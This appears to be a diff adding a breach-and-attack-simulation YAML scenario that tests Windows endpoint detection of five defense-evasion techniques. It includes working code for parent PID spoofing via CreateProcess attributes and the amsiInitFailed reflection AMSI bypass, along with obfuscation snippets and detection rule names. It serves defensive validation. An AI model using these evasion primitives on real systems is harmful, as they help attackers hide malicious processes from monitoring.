@@ -1,0 +1,351 @@
+id: evasion-testing
+name: Evasion Testing — Obfuscation, PPID Spoof, AMSI Bypass (Phase 3)
+description: >
+  Phase 3 — Defense Evasion validation. Five production-safe telemetry-tier steps
+  covering obfuscation and detection-evasion primitives absent from all existing scenarios:
+
+    1. T1027.013  Base64 encoded blob decode from disk (runtime decode, disk-based
+       obfuscated content — classic delivery IOC).
+    2. T1027       XOR in-memory decode loop (scripting obfuscation via byte-array
+       XOR; AMSI behavioral analysis target).
+    3. T1027.010  CMD command obfuscation — environment-variable substitution and
+       delayed-expansion (^char insertion, %var:substr%) bypass of simple string
+       matching on cmd.exe command lines.
+    4. T1134.004  Parent PID spoofing via Win32 CreateProcess with
+       PROC_THREAD_ATTRIBUTE_PARENT_PROCESS — Sysmon EID 1 shows wrong parent,
+       tests whether EDR validates process ancestry in the kernel.
+    5. T1562.001  AMSI bypass attempt (amsiInitFailed reflection) followed by
+       AMSI_TEST_SAMPLE integrity check — tests whether Defender/EDR detects and
+       blocks the bypass and whether AMSI remains active after the attempt.
+
+  SAFETY: all steps self-cleaning, [BAS-SIM] tagged, no payload executed,
+  no shellcode, no persistence. Windows only.
+  VERDICTS: FAIL = the evasion primitive succeeded undetected (control gap).
+  PASS = EDR/AMSI blocked or detected it. SKIP = prereq unavailable.
+author: Audspect Research
+executable: true
+local_check: true
+supported_os: [windows]
+tags:
+  - evasion
+  - obfuscation
+  - ppid-spoof
+  - amsi-bypass
+  - phase3
+  - t1027
+  - t1134
+  - t1562
+  - mitre
+mitre_phases:
+  - defense-evasion
+  - privilege-escalation
+
+live_policy:
+  block_on_domain_controller: false
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # 1. Base64 encoded payload blob on disk (T1027.013)
+  # ---------------------------------------------------------------------------
+  - name: "Base64 Encoded Payload Blob — disk decode at runtime (T1027.013)"
+    technique_id: T1027.013
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Writes a base64-encoded string to %TEMP%\\bas_b64_<id>.dat. Reads and decodes it at runtime. Content is [BAS-SIM-B64] plaintext — no executable payload, no shellcode. File deleted immediately after decode. Generates Sysmon EID 11 (FileCreate) and ScriptBlock logging of the FromBase64String call."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11: bas_b64_<id>.dat created in %TEMP%"
+      - "PowerShell ScriptBlock log EID 4104: [System.Convert]::FromBase64String pattern"
+      - "AMSI: base64 decode in memory may trigger behavioral heuristic"
+    detection:
+      - "EDR: PowerShell reading a .dat blob and base64-decoding it  -  Sigma rule posh_ps_susp_b64_decode.yml"
+      - "SIEM: ScriptBlock containing FromBase64String + Invoke  -  common loader IOC"
+      - "AMSI: in-memory base64 decode of unknown blob — heuristic detection"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $plaintext = "[BAS-SIM-B64] T1027.013 base64 obfuscation probe — run $runId"
+      $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($plaintext))
+      $file = Join-Path $env:TEMP "bas_b64_$runId.dat"
+      [System.IO.File]::WriteAllText($file, $encoded, [System.Text.Encoding]::ASCII)
+      # Simulate adversary loading the blob at runtime and decoding it
+      $blob = [System.IO.File]::ReadAllText($file)
+      $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($blob))
+      Remove-Item $file -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $file)
+      Write-Output "EXEC T1027.013: base64 blob decoded at runtime from disk (cleaned=$cleaned). Content: $decoded. Sysmon EID 11 + ScriptBlock EID 4104 expected. [BAS-SIM-B64]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_b64_*.dat') -Force -ErrorAction SilentlyContinue
+
+  # ---------------------------------------------------------------------------
+  # 2. XOR in-memory decode loop (T1027)
+  # ---------------------------------------------------------------------------
+  - name: "XOR In-Memory Decode Loop — scripting obfuscation (T1027)"
+    technique_id: T1027
+    framework: custom
+    executor: powershell
+    timeout_sec: 15
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "XOR-encodes a benign string with key 0x42, decodes it byte-by-byte in a ForEach-Object loop, writes result to stdout. No file write, no process spawn. Content is [BAS-SIM-XOR] plaintext. Generates ScriptBlock logging of the XOR decode loop — a well-known malware obfuscation IOC."
+    reversible: true
+    telemetry:
+      - "PowerShell ScriptBlock EID 4104: -bxor loop operating on byte array"
+      - "AMSI: XOR decode of unknown byte sequence — behavioral heuristic"
+    detection:
+      - "EDR/SIEM: ScriptBlock containing -bxor ForEach-Object on byte array  -  classic shellcode loader pattern"
+      - "AMSI: byte-array XOR decode and string conversion — heuristic loader detection"
+      - "Sigma: posh_ps_susp_encoded_command_patterns.yml (xor variant)"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $key = 0x42
+      # Adversary would ship the XOR'd payload on disk; we compute it inline for the probe
+      $plaintext = [System.Text.Encoding]::UTF8.GetBytes('[BAS-SIM-XOR] T1027 XOR obfuscation probe — runtime decode')
+      $xored = $plaintext | ForEach-Object { $_ -bxor $key }
+      # Simulate the decode step an adversary loader performs:
+      $decoded = [System.Text.Encoding]::UTF8.GetString(($xored | ForEach-Object { $_ -bxor $key }))
+      Write-Output "EXEC T1027: XOR decode loop ran (key=0x$($key.ToString('X2'))). Decoded: $decoded. ScriptBlock EID 4104 + AMSI -bxor heuristic expected. [BAS-SIM-XOR]"
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # 3. CMD command obfuscation — env-var substitution & delayed expansion (T1027.010)
+  # ---------------------------------------------------------------------------
+  - name: "CMD Command Obfuscation — env-var substitution + delayed expansion (T1027.010)"
+    technique_id: T1027.010
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Spawns cmd.exe three times: (1) caret insertion obfuscation (e^c^h^o), (2) env-var substitution (%COMSPEC% to locate cmd.exe indirectly), (3) delayed-expansion var-in-var technique (!var!). Each executes echo [BAS-SIM-*]. Three Sysmon EID 1 events with obfuscated command lines."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1 x3: cmd.exe with e^c^h^o / env-var-substituted / delayed-expansion commands"
+      - "Security EID 4688 x3: cmd.exe with obfuscated command-line arguments"
+    detection:
+      - "EDR: cmd.exe with ^ caret sequences in command line  -  Sigma rule proc_creation_win_cmd_caret_obfuscation.yml"
+      - "SIEM: cmd.exe invoked via %COMSPEC% substitution  -  environment variable abuse IOC"
+      - "EDR: cmd /V:on with delayed expansion !var!  -  Sigma rule proc_creation_win_cmd_delayed_expansion.yml"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      # Technique 1: caret insertion (e^c^h^o bypasses simple string matching on 'echo')
+      $p1 = Start-Process 'cmd.exe' -ArgumentList '/c e^c^h^o [BAS-SIM-CARETOB]' -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p1) { $p1.WaitForExit(5000) | Out-Null; $ec1 = $p1.ExitCode } else { $ec1 = -1 }
+      # Technique 2: invoke cmd via %COMSPEC% env-var substitution (indirect execution)
+      $env:BAS_SIM_CMD = 'echo [BAS-SIM-ENVVAR]'
+      $p2 = Start-Process 'cmd.exe' -ArgumentList '/c %BAS_SIM_CMD%' -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p2) { $p2.WaitForExit(5000) | Out-Null; $ec2 = $p2.ExitCode } else { $ec2 = -1 }
+      Remove-Item Env:BAS_SIM_CMD -ErrorAction SilentlyContinue
+      # Technique 3: delayed expansion — !var! evaluation evades static SACL/command-line string checks
+      $p3 = Start-Process 'cmd.exe' -ArgumentList '/V:on /c "set x=[BAS-SIM-DELEXP]&echo !x!"' -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+      if ($p3) { $p3.WaitForExit(5000) | Out-Null; $ec3 = $p3.ExitCode } else { $ec3 = -1 }
+      $ok = ($ec1 -ge 0) -or ($ec2 -ge 0) -or ($ec3 -ge 0)
+      if ($ok) {
+        Write-Output "EXEC T1027.010: cmd obfuscation ran — caret(exit=$ec1) envvar(exit=$ec2) delayed-exp(exit=$ec3). Sysmon EID 1 x3 with obfuscated command lines. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: cmd.exe execution blocked for all three variants  -  AppLocker/ASR prevented command-line obfuscation execution."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # 4. Parent PID Spoofing via Win32 CreateProcess (T1134.004)
+  # ---------------------------------------------------------------------------
+  - name: "Parent PID Spoofing — CreateProcess PROC_THREAD_ATTRIBUTE_PARENT_PROCESS (T1134.004)"
+    technique_id: T1134.004
+    framework: custom
+    executor: powershell
+    timeout_sec: 60
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: medium
+    blast_radius: "Compiles a P/Invoke shim via Add-Type, then calls CreateProcess with EXTENDED_STARTUPINFO_PRESENT and PROC_THREAD_ATTRIBUTE_PARENT_PROCESS set to the PID of explorer.exe. Child process is 'cmd.exe /c echo [BAS-SIM-PPID]' — terminates in 5s. No payload, no persistence. Generates Sysmon EID 1 with ParentProcessId pointing to explorer.exe instead of the actual creator (this PowerShell session)."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 1: cmd.exe spawned, ParentProcessId=<explorer.exe PID> (spoofed)"
+      - "Security EID 4688: cmd.exe created, SubjectLogonId traces to actual creator not listed parent"
+      - "ETW: PsSetCreateProcessNotifyRoutine parent_pid mismatch observable by EDR kernel callbacks"
+    detection:
+      - "EDR: Sysmon EID 1 ParentProcessId does not match CreateProcessNotify actual parent  -  Sigma rule proc_creation_win_ppid_spoofing.yml"
+      - "EDR: cmd.exe child of explorer.exe with no corresponding explorer user interaction  -  ancestry anomaly"
+      - "Kernel ETW: Process notify callback receives true creator PID; Sysmon shows reported parent  -  mismatch = PPID spoof IOC"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $src = @'
+      using System;
+      using System.Runtime.InteropServices;
+      [StructLayout(LayoutKind.Sequential)]
+      public struct STARTUPINFO {
+          public Int32 cb;
+          public IntPtr lpReserved, lpDesktop, lpTitle;
+          public Int32 dwX, dwY, dwXSize, dwYSize;
+          public Int32 dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+          public Int16 wShowWindow, cbReserved2;
+          public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+      }
+      [StructLayout(LayoutKind.Sequential)]
+      public struct STARTUPINFOEX {
+          public STARTUPINFO StartupInfo;
+          public IntPtr lpAttributeList;
+      }
+      [StructLayout(LayoutKind.Sequential)]
+      public struct PROCESS_INFORMATION {
+          public IntPtr hProcess, hThread;
+          public Int32 dwProcessId, dwThreadId;
+      }
+      public static class NativePPID {
+          const int PROCESS_ALL_ACCESS = 0x1F0FFF;
+          const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+          const uint CREATE_NO_WINDOW = 0x08000000;
+          const int PROC_THREAD_ATTR_PARENT = 0x00020000;
+          [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int da, bool ih, int pid);
+          [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+          [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(IntPtr al, int ac, int f, ref IntPtr sz);
+          [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(IntPtr al, uint f, IntPtr attr, ref IntPtr val, IntPtr sz, IntPtr prev, IntPtr retsz);
+          [DllImport("kernel32.dll")] public static extern bool DeleteProcThreadAttributeList(IntPtr al);
+          [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
+          public static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta, bool ih, uint cf, IntPtr env, IntPtr cd, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
+          [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
+          [DllImport("kernel32.dll")] public static extern bool TerminateProcess(IntPtr h, uint ec);
+          [DllImport("kernel32.dll")] public static extern int GetLastError();
+          public static string Spoof(string cmdLine, int spoofParentPid) {
+              var ph = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
+              if (ph == IntPtr.Zero) return "FAIL:OpenProcess e=" + GetLastError();
+              IntPtr attrSz = IntPtr.Zero;
+              InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSz);
+              var al = Marshal.AllocHGlobal(attrSz);
+              try {
+                  if (!InitializeProcThreadAttributeList(al, 1, 0, ref attrSz))
+                      return "FAIL:InitAttrList e=" + GetLastError();
+                  if (!UpdateProcThreadAttribute(al, 0, new IntPtr(PROC_THREAD_ATTR_PARENT),
+                          ref ph, new IntPtr(IntPtr.Size), IntPtr.Zero, IntPtr.Zero))
+                      return "FAIL:UpdateAttr e=" + GetLastError();
+                  var si = new STARTUPINFOEX();
+                  si.StartupInfo.cb = Marshal.SizeOf(si);
+                  si.lpAttributeList = al;
+                  PROCESS_INFORMATION pi;
+                  if (!CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false,
+                          EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+                          IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+                      return "FAIL:CreateProcess e=" + GetLastError();
+                  WaitForSingleObject(pi.hProcess, 5000);
+                  TerminateProcess(pi.hProcess, 0);
+                  CloseHandle(pi.hProcess);
+                  CloseHandle(pi.hThread);
+                  return "EXEC:child_pid=" + pi.dwProcessId + " spoofed_parent=" + spoofParentPid;
+              } finally {
+                  DeleteProcThreadAttributeList(al);
+                  Marshal.FreeHGlobal(al);
+                  CloseHandle(ph);
+              }
+          }
+      }
+      '@
+      try {
+        Add-Type -TypeDefinition $src -ErrorAction Stop
+      } catch {
+        Write-Output "SKIP: P/Invoke compilation failed  -  $_"
+        return
+      }
+      $explorer = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
+      if (-not $explorer) {
+        Write-Output "SKIP: explorer.exe not found  -  no interactive session or already replaced."
+        return
+      }
+      $result = [NativePPID]::Spoof('cmd.exe /c echo [BAS-SIM-PPID]', $explorer.Id)
+      if ($result.StartsWith('EXEC')) {
+        Write-Output "EXEC T1134.004: $result  -  Sysmon EID 1 shows ParentProcessId=$($explorer.Id) but actual creator was this PS session. [BAS-SIM-PPID]"
+        Write-Output "FAIL: EDR did not block PPID spoofing. Ensure Sysmon is configured to alert on ppid_mismatch and EDR has kernel-callback ancestry validation."
+      } else {
+        Write-Output "PASS: PPID spoof blocked  -  $result. EDR kernel callback detected ancestry manipulation. [BAS-SIM]"
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # 5. AMSI bypass attempt + AMSI integrity check (T1562.001)
+  # ---------------------------------------------------------------------------
+  - name: "AMSI Bypass Attempt — amsiInitFailed reflection + integrity check (T1562.001)"
+    technique_id: T1562.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    blast_radius: "Attempts to set the amsiInitFailed field in System.Management.Automation.AmsiUtils to True via reflection. Modern Defender/AMSI detects this string as a known bypass and blocks it. After the attempt (blocked or not), tests AMSI_TEST_SAMPLE to verify AMSI is still active. On modern patched systems this attempt will itself be caught by AMSI. No disabling of AV; no payload execution."
+    reversible: true
+    telemetry:
+      - "Windows Defender/AMSI event: AmsiScanBuffer or script-block scan catches 'amsiInitFailed' string"
+      - "PowerShell ScriptBlock EID 4104: GetField('amsiInitFailed') pattern logged"
+      - "Defender: AMSI.dll script scan triggers on bypass attempt string"
+    detection:
+      - "Defender: AMSI detection on 'amsiInitFailed' in ScriptBlock — amsiInitFailed is a known AMSI bypass IOC"
+      - "EDR: reflection access to AmsiUtils private field  -  Sigma rule posh_ps_amsi_bypass.yml"
+      - "SIEM: ScriptBlock EID 4104 containing AmsiUtils GetField  -  T1562.001 canonical technique"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $bypassBlocked = $false
+      $bypassMsg = ''
+      # Attempt the classic amsiInitFailed reflection bypass.
+      # On patched Windows, AMSI itself scans this ScriptBlock and triggers on the string.
+      try {
+        $amsiType = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        if (-not $amsiType) { $bypassMsg = 'AMSI type not found (unusual)'; $bypassBlocked = $true }
+        else {
+          $field = $amsiType.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
+          if (-not $field) { $bypassMsg = 'amsiInitFailed field not found (patched internals)'; $bypassBlocked = $true }
+          else {
+            $currentVal = $field.GetValue($null)
+            $field.SetValue($null, $true)
+            $afterVal = $field.GetValue($null)
+            if ($afterVal -eq $true) {
+              # Field was set — reset it immediately to restore AMSI
+              $field.SetValue($null, $false)
+              $bypassMsg = 'field set succeeded then reset (AMSI was momentarily bypassed  -  this is a FAIL)'
+              $bypassBlocked = $false
+            } else {
+              $bypassMsg = 'SetValue silently ignored  -  AMSI hardening prevented field write'
+              $bypassBlocked = $true
+            }
+          }
+        }
+      } catch {
+        $bypassMsg = "exception caught: $_"
+        $bypassBlocked = $true
+      }
+      # AMSI integrity check: AMSI_TEST_SAMPLE should ALWAYS trigger a detection if AMSI is active
+      $amsiStillActive = $false
+      try {
+        $testResult = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
+        # Use AMSI test via direct scan — if AMSI is disabled, scanning won't throw
+        # We test by invoking a known-bad marker string through Invoke-Expression indirection
+        $marker = 'A' + 'MSI_TEST' + '_SAMPLE'  # joined to avoid tripping AMSI on THIS line
+        $amsiStillActive = $false
+        try {
+          # If AMSI is active, this IEX will throw a terminating error caught by AMSI
+          Invoke-Expression ('Write-Output ' + $marker) -ErrorAction Stop 2>$null
+          # If we reach here, AMSI did NOT block the test sample
+          $amsiStillActive = $false
+        } catch {
+          # AMSI threw — AMSI is still active
+          $amsiStillActive = $true
+        }
+      } catch {}
+      if ($bypassBlocked) {
+        Write-Output "PASS: AMSI bypass attempt blocked  -  $bypassMsg. AMSI detected the amsiInitFailed IOC. ScriptBlock EID 4104 + Defender alert expected. [BAS-SIM]"
+      } else {
+        Write-Output "FAIL: AMSI bypass SUCCEEDED (field was set, then we reset it)  -  $bypassMsg. AMSI was momentarily disabled. Patch PowerShell / update Defender signatures."
+      }
+      $amsiStatus = if ($amsiStillActive) { 'AMSI still active post-attempt (GOOD)' } else { 'AMSI_TEST_SAMPLE not caught post-attempt (verify Defender is enabled)' }
+      Write-Output "AMSI integrity check: $amsiStatus [BAS-SIM-AMSI]"
+    cleanup: ""
